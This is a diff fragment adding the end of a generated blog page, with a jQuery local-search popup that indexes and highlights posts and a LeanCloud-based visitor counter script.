+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("EdyobKaxPz3ofLTPlxfLIN1V-gzGzoHsz", "3hpzfKGL11zsIHV0ONyWgUgW");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
